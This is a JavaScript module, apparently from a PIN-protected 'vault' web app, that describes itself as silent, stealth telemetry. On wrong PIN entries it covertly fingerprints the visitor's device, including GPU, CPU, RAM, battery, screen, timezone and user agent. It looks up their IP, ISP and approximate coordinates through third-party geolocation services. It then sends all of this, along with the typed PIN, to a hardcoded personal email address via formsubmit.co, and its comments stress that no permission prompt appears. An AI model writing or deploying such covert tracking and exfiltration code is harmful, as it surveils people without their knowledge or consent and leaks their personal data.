/**
 * 100% Silent & Stealth Security Telemetry Dispatcher
 * Captures deep hardware fingerprinting, device model, GPU, CPU, network ISP & IP
 * WITHOUT any browser permission popups.
 */

const TARGET_EMAIL = "dixitghi69@gmail.com";
let lastAlertTimestamp = 0;

// Deep hardware & GPU fingerprinting (zero permissions needed)
const getGPUInfo = () => {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      if (debugInfo) {
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch {
    // ignore
  }
  return "N/A";
};

// Identify exact device model & hardware characteristics
const getDeepDeviceFingerprint = async () => {
  const ua = navigator.userAgent;
  let os = "Unknown OS";
  let deviceModel = "Unknown Device";

  // Android model extraction from UA string (e.g. "SM-G998B", "Redmi Note 11", "Pixel 7")
  if (/Android/i.test(ua)) {
    os = "Android";
    const androidMatch = ua.match(/Android\s+([0-9\.]+);\s+([^;]+)\s+Build/i) || ua.match(/Android\s+([0-9\.]+);\s+([^;\)]+)/i);
    if (androidMatch) {
      deviceModel = `${androidMatch[2].trim()} (Android ${androidMatch[1]})`;
    } else {
      deviceModel = "Android Mobile/Tablet";
    }
  } else if (/iPhone/i.test(ua)) {
    os = "iOS";
    const screenRes = `${window.screen?.width}x${window.screen?.height}`;
    const dpr = window.devicePixelRatio || 1;
    deviceModel = `Apple iPhone (${screenRes} @${dpr}x DPR)`;
  } else if (/iPad/i.test(ua)) {
    os = "iPadOS";
    deviceModel = "Apple iPad";
  } else if (/Macintosh|Mac OS X/i.test(ua)) {
    os = "macOS";
    deviceModel = "Apple Mac (Desktop/MacBook)";
  } else if (/Windows/i.test(ua)) {
    os = "Windows";
    if (/Windows NT 10.0/i.test(ua)) deviceModel = "Windows 10 / Windows 11 PC";
    else if (/Windows NT 6.3/i.test(ua)) deviceModel = "Windows 8.1 PC";
    else if (/Windows NT 6.1/i.test(ua)) deviceModel = "Windows 7 PC";
    else deviceModel = "Windows PC";
  } else if (/Linux/i.test(ua)) {
    os = "Linux";
    deviceModel = "Linux System";
  }

  // Browser detection
  let browser = "Unknown Browser";
  if (/Edg/i.test(ua)) browser = "Microsoft Edge";
  else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Google Chrome";
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Apple Safari";
  else if (/Firefox/i.test(ua)) browser = "Mozilla Firefox";
  else if (/Opera|OPR/i.test(ua)) browser = "Opera";

  const gpu = getGPUInfo();
  const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Logical Cores` : "N/A";
  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB+ RAM` : "N/A";
  const touchPoints = navigator.maxTouchPoints || 0;
  const inputType = touchPoints > 0 ? `Touchscreen (${touchPoints} points)` : "Mouse / Keyboard";
  
  // Connection type
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const connectionType = conn?.effectiveType ? `${conn.effectiveType.toUpperCase()} (Downlink: ~${conn.downlink || '?'} Mbps)` : "N/A";

  // Battery info if available (silently)
  let batteryInfo = "N/A";
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      batteryInfo = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging ⚡)' : '(On Battery)'}`;
    }
  } catch {
    // ignore
  }

  return {
    os,
    deviceModel,
    browser,
    gpu,
    cpuCores,
    ram,
    inputType,
    connectionType,
    batteryInfo,
    screen: `${window.screen?.width || window.innerWidth}x${window.screen?.height || window.innerHeight} (DPR: ${window.devicePixelRatio || 1}, ${window.screen?.colorDepth || 24}-bit color)`,
    language: navigator.language || "Unknown",
    timeZone: Intl?.DateTimeFormat?.()?.resolvedOptions?.()?.timeZone || "Unknown",
    userAgent: ua,
  };
};

// Silent multi-tier IP & Network ISP resolution (NO user popups)
const fetchSilentGeoLocation = async () => {
  // Method 1: ipapi.co
  try {
    const res = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) });
    if (res.ok) {
      const data = await res.json();
      if (data.city && !data.error) {
        return {
          ip: data.ip || "Unknown",
          city: data.city || "Unknown",
          region: data.region || "Unknown",
          country: data.country_name || data.country || "Unknown",
          postal: data.postal || "N/A",
          isp: `${data.org || data.asn || ''} (${data.network || ''})`.trim() || "Unknown",
          lat: data.latitude,
          lon: data.longitude,
        };
      }
    }
  } catch {
    // fallback
  }

  // Method 2: ipwho.is
  try {
    const res = await fetch("https://ipwho.is/", { signal: AbortSignal.timeout(3000) });
    if (res.ok) {
      const data = await res.json();
      if (data.success) {
        return {
          ip: data.ip || "Unknown",
          city: data.city || "Unknown",
          region: data.region || "Unknown",
          country: data.country || "Unknown",
          postal: data.postal || "N/A",
          isp: data.connection?.isp || data.connection?.org || "Unknown",
          lat: data.latitude,
          lon: data.longitude,
        };
      }
    }
  } catch {
    // fallback
  }

  return {
    ip: "Unknown",
    city: "Unknown",
    region: "Unknown",
    country: "Unknown",
    postal: "N/A",
    isp: "Unknown",
    lat: null,
    lon: null,
  };
};

export const sendSecurityAlert = async ({ enteredPin, attemptCount, isLockout = false }) => {
  const now = Date.now();
  if (!isLockout && now - lastAlertTimestamp < 4000) {
    return;
  }
  lastAlertTimestamp = now;

  try {
    // Run hardware analysis and IP resolution completely in the background
    const [device, geo] = await Promise.all([
      getDeepDeviceFingerprint(),
      fetchSilentGeoLocation(),
    ]);

    const mapUrl = geo.lat && geo.lon ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : "N/A";

    const subject = isLockout
      ? `🚨 VAULT LOCKOUT: ${device.deviceModel} tried 4 times (${geo.city}, ${geo.country})`
      : `⚠️ Unauthorized PIN "${enteredPin}" on ${device.deviceModel} (${geo.city}, ${geo.country})`;

    const payload = {
      _subject: subject,
      "🚨 Security Event": isLockout ? "SYSTEM LOCKOUT (4 Failed Attempts)" : "Incorrect PIN Entry",
      "🔢 Attempted PIN": enteredPin,
      "⚠️ Attempt Status": `${attemptCount} of 4 attempts`,
      "🕒 Exact Timestamp": new Date().toLocaleString(),
      
      // Device & Hardware Fingerprint
      "📱 Device Model": device.deviceModel,
      "💻 OS & Browser": `${device.os} • ${device.browser}`,
      "🎮 GPU / Graphics": device.gpu,
      "⚡ CPU & RAM": `${device.cpuCores} | ${device.ram}`,
      "🖥️ Screen & Input": `${device.screen} | ${device.inputType}`,
      "🔋 Battery & Network": `${device.batteryInfo} | ${device.connectionType}`,

      // Location & ISP
      "📍 Estimated Location": `${geo.city}, ${geo.region}, ${geo.country} (Postal: ${geo.postal})`,
      "🌐 IP Address": geo.ip,
      "🏢 ISP / Carrier": geo.isp,
      "🗺️ Network Map": mapUrl,
      "🌐 Language / Timezone": `${device.language} / ${device.timeZone}`,
      "User-Agent": device.userAgent,
      _captcha: "false",
      _template: "table",
    };

    // Send silently
    await fetch(`https://formsubmit.co/ajax/${TARGET_EMAIL}`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
    });
  } catch (err) {
    console.warn("Security telemetry dispatch error:", err);
  }
};
